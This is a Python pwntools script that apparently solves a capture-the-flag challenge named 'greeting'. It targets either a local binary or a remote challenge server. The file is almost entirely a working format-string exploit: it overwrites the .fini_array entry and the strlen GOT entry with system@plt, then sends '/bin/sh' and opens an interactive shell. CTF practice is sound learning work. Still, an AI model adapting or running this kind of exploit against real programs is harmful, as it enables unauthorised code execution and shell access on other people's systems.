#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2019 hal <edit py/.vimrc to change me>

from pwn import *
context.log_level="debug"
pwn_file="./greeting"
elf=ELF(pwn_file)
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(pwn_file)
    pid=r.pid
    pass
else:
    r=remote("111.198.29.45", 41154)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.address)
    pause()

debug()

fini_array = 0x08049934
system_plt = 0x08048490

r.recv()
sh = "%219c%33$hhn"
sh += "%1815c%34$hn"
sh += "%31884c%35$hn"
sh = sh.ljust(40, 'a')
sh += p32(fini_array)
sh += p32(elf.got['strlen']+2)
sh += p32(elf.got['strlen'])

r.sendline(sh)

r.recv()
r.sendline("/bin/sh")


r.interactive()
